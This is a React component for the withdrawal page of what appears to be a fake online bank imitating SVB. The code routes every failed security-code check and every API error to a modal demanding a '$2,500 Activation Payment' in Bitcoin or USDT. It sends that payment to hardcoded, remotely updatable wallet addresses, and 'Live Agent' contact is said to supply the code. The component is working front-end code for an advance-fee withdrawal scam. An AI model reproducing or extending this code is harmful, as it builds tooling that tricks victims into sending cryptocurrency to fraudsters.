import React, { useState } from 'react';
import { User, Transaction } from '../types';
import { api } from '../services/api';
import { subscribeCryptoAddressesFromFirestore } from '../lib/firebase';
import { ArrowUpRight, Landmark, CreditCard, DollarSign, AlertCircle, CheckCircle2, ShieldCheck, Key, X, ShieldAlert, Clock, Copy, Check, FileText } from 'lucide-react';
import { PaymentProofOptionsModal } from './PaymentProofOptionsModal';
import { triggerOpenSVBLiveChat } from './SupportChatWidget';
import { openLiveAgentEmail } from '../utils/supportEmail';
import { BackButton } from './BackButton';

interface WithdrawPanelProps {
  user: User;
  onSuccess: (updatedUser: User, transaction: Transaction) => void;
  onNavigateTab?: (tab: string) => void;
}

export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, onNavigateTab }) => {
  const [bankName, setBankName] = useState('');
  const [routingNumber, setRoutingNumber] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountHolderName, setAccountHolderName] = useState(user.fullName);
  const [amount, setAmount] = useState('');
  const [fourDigitCode, setFourDigitCode] = useState('');
  const [note, setNote] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [successTxn, setSuccessTxn] = useState<Transaction | null>(null);

  const [showVerificationModal, setShowVerificationModal] = useState(false);
  const [verificationError, setVerificationError] = useState<string | null>(null);

  // Deposit $2,500 USD requirement modal state
  const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
  const [showCryptoModal, setShowCryptoModal] = useState(false);
  const [showProofOptionsModal, setShowProofOptionsModal] = useState(false);
  const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
  const [submittingDeposit, setSubmittingDeposit] = useState(false);
  const [depositSuccessMsg, setDepositSuccessMsg] = useState<string | null>(null);
  const [copiedAddress, setCopiedAddress] = useState(false);

  const [walletAddresses, setWalletAddresses] = useState<{ BTC: string; USDT: string }>({
    BTC: '1Fy9Up78qVeawXCLnAqcnRJrvjiXLJF21d',
    USDT: '0x400773d018e8ad3575458b5e8b11ff55078451c9'
  });

  React.useEffect(() => {
    api.getCryptoAddresses()
      .then(res => {
        if (res.addresses) setWalletAddresses(res.addresses);
      })
      .catch(console.error);

    const unsub = subscribeCryptoAddressesFromFirestore((addrs) => {
      setWalletAddresses(prev => ({ ...prev, ...addrs }));
    });

    const handleWindowUpdate = (e: any) => {
      if (e.detail) setWalletAddresses(prev => ({ ...prev, ...e.detail }));
    };
    window.addEventListener('crypto-addresses-updated', handleWindowUpdate);

    return () => {
      unsub();
      window.removeEventListener('crypto-addresses-updated', handleWindowUpdate);
    };
  }, [showCryptoModal, showDepositPromptModal]);

  const copyAddress = (address: string) => {
    navigator.clipboard.writeText(address);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handleCryptoDepositSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setShowProofOptionsModal(true);
  };

  const handleSelectLiveAgent = async () => {
    setShowProofOptionsModal(false);
    setShowCryptoModal(false);
    
    openLiveAgentEmail(user, {
      method: cryptoMethod,
      amount: 2500,
      walletAddress: walletAddresses[cryptoMethod]
    });

    try {
      const res = await api.submitCryptoActivationDeposit({
        cryptoMethod,
        txHash: '',
        proofNote: 'Submitted to Live Agent (External Email)',
        proofImage: undefined
      });
      if (res.user && onSuccess) {
        onSuccess(res.user, null as any);
      }
      setDepositSuccessMsg(`Payment proof details opened in your email client. Our Live Support agent will verify and issue your 4-Digit Code.`);
      setTimeout(() => setDepositSuccessMsg(null), 5000);
    } catch (err: any) {
      console.error(err);
    }
  };

  const handleSelectSVBLive = async () => {
    setError(null);
    setSubmittingDeposit(true);

    try {
      const res = await api.submitCryptoActivationDeposit({
        cryptoMethod,
        txHash: '',
        proofNote: '$2,500 Payment Proof Verification Request',
        proofImage: undefined
      });
      if (res.user && onSuccess) {
        onSuccess(res.user, null as any);
      }
      setShowProofOptionsModal(false);
      setShowCryptoModal(false);
      setDepositSuccessMsg(`Connecting to SVB Live Chat...`);
      
      setTimeout(() => {
        triggerOpenSVBLiveChat();
        setDepositSuccessMsg(null);
      }, 500);
    } catch (err: any) {
      setError(err.message || 'Failed to submit activation deposit proof.');
    } finally {
      setSubmittingDeposit(false);
    }
  };

  const handleInitialFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setSuccessTxn(null);

    const numAmount = parseFloat(amount);
    if (!bankName || !routingNumber || !accountNumber || !accountHolderName) {
      setError('Please fill in all receiving bank account details.');
      return;
    }
    if (isNaN(numAmount) || numAmount <= 0) {
      setError('Please enter a valid withdrawal amount greater than $0.00.');
      return;
    }
    if (numAmount > user.balance) {
      setError(`Insufficient funds. Your available balance is $${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })}.`);
      return;
    }

    setVerificationError(null);
    setShowVerificationModal(true);
  };

  const executeWithdrawWithCode = async (e: React.FormEvent) => {
    e.preventDefault();
    setVerificationError(null);

    if (user.role !== 'admin' && (!fourDigitCode.trim() || !user.fourDigitCode || fourDigitCode.trim() !== user.fourDigitCode.trim())) {
      setShowVerificationModal(false);
      setShowCryptoModal(true);
      return;
    }

    const numAmount = parseFloat(amount);

    try {
      setLoading(true);
      const res = await api.withdrawFunds({
        bankName: bankName.trim(),
        routingNumber: routingNumber.trim(),
        accountNumber: accountNumber.trim(),
        accountHolderName: accountHolderName.trim(),
        amount: numAmount,
        note: note.trim(),
        fourDigitCode: fourDigitCode.trim()
      });
      setSuccessTxn(res.transaction);
      onSuccess(res.updatedUser, res.transaction);
      
      setShowVerificationModal(false);
      setAmount('');
      setFourDigitCode('');
      setNote('');
    } catch (err: any) {
      setShowVerificationModal(false);
      setShowCryptoModal(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-2xl mx-auto space-y-6 pb-12 font-sans">
      {/* Top Navigation Row */}
      <div className="flex items-center justify-between">
        <BackButton />
      </div>

      {/* Header Banner */}
      <div className="bg-[#002b49] rounded-2xl p-6 sm:p-7 text-white shadow-xs border border-[#0b1723] space-y-4">
        <div className="flex items-center gap-4">
          <div className="w-12 h-12 rounded-xl bg-[#0b1d2e] text-[#00a3e0] flex items-center justify-center font-bold text-sm shrink-0 shadow-xs">
            <ArrowUpRight className="w-6 h-6" />
          </div>
          <div>
            <h2 className="text-xl font-extrabold text-white tracking-tight">External Wire & ACH Withdrawal</h2>
            <p className="text-xs text-slate-300 mt-0.5">
              Withdraw funds directly to any commercial domestic or international banking institution.
            </p>
          </div>
        </div>

        {/* Balance Card */}
        <div className="p-3.5 bg-[#0b1d2e] border border-[#173652] rounded-xl flex items-center justify-between">
          <div>
            <p className="text-[11px] text-slate-400 font-semibold uppercase">Available Balance</p>
            <p className="text-xl font-mono font-extrabold text-white mt-0.5 tabular-nums">
              ${(Number(user.balance) || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })} <span className="text-xs font-sans text-slate-400">{user.currency || 'USD'}</span>
            </p>
          </div>
          <div className="text-right">
            <p className="text-[10px] text-slate-400 uppercase">Clearance Window</p>
            <span className="text-[10px] font-bold text-cyan-300 bg-cyan-950/60 border border-cyan-800/60 px-2 py-0.5 rounded-full inline-block mt-0.5">
              Fedwire Cleared
            </span>
          </div>
        </div>
      </div>

      {/* Success Receipt Banner */}
      {successTxn && (
        <div className="bg-emerald-50 border border-emerald-200 rounded-2xl p-5 text-slate-800 space-y-3 shadow-xs">
          <div className="flex items-center gap-2.5">
            <CheckCircle2 className="w-5 h-5 text-emerald-600 shrink-0" />
            <span className="font-bold text-slate-900 text-sm">Wire Withdrawal Executed Successfully</span>
          </div>
          <div className="bg-white rounded-xl p-3 border border-emerald-100 text-xs space-y-1 font-mono">
            <p className="flex justify-between text-slate-600">
              <span>Reference:</span>
              <span className="text-emerald-700 font-bold">{successTxn.reference}</span>
            </p>
            <p className="flex justify-between text-slate-600">
              <span>Amount Withdrawn:</span>
              <span className="text-slate-900 font-bold">${(Number(successTxn.amount) || 0).toFixed(2)} USD</span>
            </p>
            <p className="flex justify-between text-slate-600">
              <span>Destination:</span>
              <span className="text-slate-800">{bankName} (****{accountNumber.slice(-4)})</span>
            </p>

            <div className="flex flex-wrap items-center gap-2 pt-3 border-t border-slate-100 font-sans">
              <button
                type="button"
                onClick={() => onNavigateTab && onNavigateTab('dashboard')}
                className="px-3.5 py-1.5 bg-[#002b49] hover:bg-[#001f35] text-white rounded-xl text-xs font-bold transition-all shadow-xs cursor-pointer"
              >
                <span>← Return to Dashboard</span>
              </button>
              <button
                type="button"
                onClick={() => onNavigateTab && onNavigateTab('history')}
                className="px-3.5 py-1.5 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-xl text-xs font-semibold transition-all border border-slate-200 cursor-pointer"
              >
                <span>View Transaction History</span>
              </button>
              <button
                type="button"
                onClick={() => setSuccessTxn(null)}
                className="px-3 py-1.5 text-slate-500 hover:text-slate-800 text-xs font-medium transition-colors cursor-pointer ml-auto"
              >
                + New Withdrawal
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Error Message */}
      {error && (
        <div className="bg-rose-50 border border-rose-200 rounded-xl p-4 flex items-start gap-2.5 text-rose-800 text-xs shadow-xs">
          <AlertCircle className="w-5 h-5 text-rose-600 shrink-0 mt-0.5" />
          <span className="font-medium">{error}</span>
        </div>
      )}

      {/* Main Withdrawal Form */}
      <form onSubmit={handleInitialFormSubmit} className="bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-6 shadow-xs space-y-4">
        <h3 className="text-sm font-bold text-slate-900 border-b border-slate-100 pb-3 flex items-center gap-2">
          <Landmark className="w-4 h-4 text-[#00a3e0]" />
          Beneficiary Account & Banking Institution
        </h3>

        <div>
          <label className="block text-xs font-semibold text-slate-700 mb-1">Beneficiary Bank Name</label>
          <input
            type="text"
            required
            value={bankName}
            onChange={(e) => setBankName(e.target.value)}
            placeholder="e.g. JPMorgan Chase, Wells Fargo, Barclays"
            className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-xs text-slate-900 outline-none transition-colors"
          />
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          <div>
            <label className="block text-xs font-semibold text-slate-700 mb-1">Routing / ABA / SWIFT Code</label>
            <input
              type="text"
              required
              value={routingNumber}
              onChange={(e) => setRoutingNumber(e.target.value)}
              placeholder="e.g. 021000021"
              className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-xs text-slate-900 font-mono outline-none transition-colors"
            />
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-700 mb-1">Beneficiary Account Number</label>
            <input
              type="text"
              required
              value={accountNumber}
              onChange={(e) => setAccountNumber(e.target.value)}
              placeholder="e.g. 1029384756"
              className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-xs text-slate-900 font-mono outline-none transition-colors"
            />
          </div>
        </div>

        <div>
          <label className="block text-xs font-semibold text-slate-700 mb-1">Account Holder Full Name</label>
          <input
            type="text"
            required
            value={accountHolderName}
            onChange={(e) => setAccountHolderName(e.target.value)}
            placeholder="Beneficiary Account Name"
            className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-xs text-slate-900 outline-none transition-colors"
          />
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          <div>
            <label className="block text-xs font-semibold text-slate-700 mb-1">Withdrawal Amount ($ USD)</label>
            <div className="relative">
              <span className="absolute left-3 top-2 text-slate-400 font-bold">$</span>
              <input
                type="number"
                step="0.01"
                min="1"
                required
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl pl-7 pr-3 py-2 text-xs text-slate-900 font-mono font-bold outline-none tabular-nums"
              />
            </div>
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-700 mb-1">Remittance Memo (Optional)</label>
            <input
              type="text"
              value={note}
              onChange={(e) => setNote(e.target.value)}
              placeholder="e.g. Treasury withdrawal, Vendor payout"
              className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-xs text-slate-900 outline-none transition-colors"
            />
          </div>
        </div>

        <button
          type="submit"
          disabled={loading || !amount || parseFloat(amount) <= 0}
          className="w-full bg-[#002b49] hover:bg-[#001f35] text-white font-bold py-2.5 px-4 rounded-xl shadow-xs flex items-center justify-center gap-2 transition-all text-xs disabled:opacity-50 cursor-pointer"
        >
          <ArrowUpRight className="w-4 h-4" />
          <span>Continue to Wire Authorization</span>
        </button>
      </form>

      {/* Verification Code Modal */}
      {showVerificationModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/70 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white border border-slate-200 rounded-2xl max-w-md w-full p-6 space-y-4 shadow-2xl relative text-slate-900">
            <button
              onClick={() => setShowVerificationModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-slate-700 p-1.5 rounded-lg bg-slate-100 cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="text-center space-y-1.5">
              <div className="w-12 h-12 rounded-xl bg-[#002b49] text-[#00a3e0] flex items-center justify-center mx-auto shadow-xs">
                <ShieldCheck className="w-6 h-6" />
              </div>
              <h3 className="text-base font-bold text-slate-900">Authorize Wire Transfer</h3>
              <p className="text-xs text-slate-500">
                Enter your 4-digit security code to confirm and dispatch this outbound wire.
              </p>
            </div>

            <div className="p-3 bg-slate-50 rounded-xl border border-slate-200 text-xs space-y-1 font-mono">
              <div className="flex justify-between text-slate-600">
                <span>Amount:</span>
                <span className="font-bold text-slate-900">${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</span>
              </div>
              <div className="flex justify-between text-slate-600">
                <span>Bank:</span>
                <span className="text-slate-900 truncate max-w-[180px]">{bankName}</span>
              </div>
              <div className="flex justify-between text-slate-600">
                <span>Account:</span>
                <span className="text-slate-900">****{accountNumber.slice(-4)}</span>
              </div>
            </div>

            <form onSubmit={executeWithdrawWithCode} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-700 mb-1">
                  4-Digit Security Code
                </label>
                <input
                  type="password"
                  maxLength={4}
                  value={fourDigitCode}
                  onChange={(e) => setFourDigitCode(e.target.value)}
                  placeholder="••••"
                  className="w-full bg-slate-50 border border-slate-300 focus:border-[#00a3e0] focus:bg-white rounded-xl px-4 py-2.5 text-center text-lg text-slate-900 font-mono font-bold tracking-widest outline-none transition-colors"
                  autoFocus
                  required
                />
              </div>

              <div className="flex gap-2">
                <button
                  type="button"
                  onClick={() => setShowVerificationModal(false)}
                  className="w-1/3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-2.5 rounded-xl text-xs transition-colors cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={loading || !fourDigitCode.trim()}
                  className="w-2/3 bg-[#002b49] hover:bg-[#001f35] text-white font-bold py-2.5 rounded-xl text-xs shadow-xs flex items-center justify-center gap-1.5 transition-all disabled:opacity-50 cursor-pointer"
                >
                  {loading ? 'Authorizing...' : 'Confirm & Wire'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Crypto Activation Deposit Modal */}
      {showCryptoModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/70 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white border border-slate-200 rounded-2xl p-6 max-w-lg w-full space-y-4 shadow-2xl relative text-slate-900">
            <button
              onClick={() => setShowCryptoModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-slate-700 p-1.5 rounded-lg bg-slate-100 cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="flex items-center gap-3 border-b border-slate-100 pb-3">
              <div className="w-10 h-10 rounded-xl bg-amber-100 text-amber-800 flex items-center justify-center">
                <Key className="w-5 h-5 text-amber-700" />
              </div>
              <div>
                <h3 className="text-base font-bold text-slate-900">$2,500 Activation Payment Address</h3>
                <p className="text-xs text-slate-500">4-Digit Security Code Authorization</p>
              </div>
            </div>

            {depositSuccessMsg && (
              <div className="p-3 bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs rounded-xl flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
                <span>{depositSuccessMsg}</span>
              </div>
            )}

            <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs">
              <div>
                <label className="block font-semibold text-slate-700 mb-1">Select Payment Asset</label>
                <div className="grid grid-cols-2 gap-2">
                  <button
                    type="button"
                    onClick={() => setCryptoMethod('BTC')}
                    className={`p-2.5 rounded-xl border font-bold text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
                      cryptoMethod === 'BTC' ? 'bg-slate-100 border-[#002b49] text-slate-900' : 'bg-slate-50 border-slate-200 text-slate-600'
                    }`}
                  >
                    Bitcoin (BTC)
                  </button>
                  <button
                    type="button"
                    onClick={() => setCryptoMethod('USDT')}
                    className={`p-2.5 rounded-xl border font-bold text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
                      cryptoMethod === 'USDT' ? 'bg-slate-100 border-[#002b49] text-slate-900' : 'bg-slate-50 border-slate-200 text-slate-600'
                    }`}
                  >
                    Tether (USDT ERC-20)
                  </button>
                </div>
              </div>

              <div className="p-3.5 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
                <div className="flex items-center justify-between text-[11px] text-slate-600">
                  <span>Required Deposit Amount:</span>
                  <span className="font-bold text-slate-900 text-xs">$2,500.00 USD</span>
                </div>
                <div>
                  <span className="text-slate-500 block mb-1">Official Wallet Address ({cryptoMethod}):</span>
                  <div
                    onClick={() => copyAddress(walletAddresses[cryptoMethod])}
                    className="cursor-pointer hover:border-slate-400 flex items-center gap-2 bg-white p-2.5 rounded-lg border border-slate-200 transition-all"
                  >
                    <span className="font-mono text-xs font-bold text-slate-900 break-all flex-1 tabular-nums">
                      {walletAddresses[cryptoMethod]}
                    </span>
                    <div className="p-1 text-slate-600 rounded flex items-center gap-1 text-[10px] font-bold">
                      {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedAddress ? 'Copied' : 'Copy'}</span>
                    </div>
                  </div>
                </div>
              </div>

              <button
                type="submit"
                disabled={submittingDeposit}
                className="w-full bg-[#002b49] hover:bg-[#001f35] text-white font-bold py-2.5 rounded-xl text-xs transition-colors cursor-pointer"
              >
                {submittingDeposit ? 'Submitting...' : 'Submit $2,500 Payment Proof for Verification'}
              </button>
            </form>
          </div>
        </div>
      )}

      {/* Payment Proof Options Modal */}
      <PaymentProofOptionsModal
        isOpen={showProofOptionsModal}
        onClose={() => setShowProofOptionsModal(false)}
        user={user}
        cryptoMethod={cryptoMethod}
        walletAddress={walletAddresses[cryptoMethod]}
        onSelectLiveAgent={handleSelectLiveAgent}
        onSelectSVBLive={handleSelectSVBLive}
        submitting={submittingDeposit}
      />
    </div>
  );
};
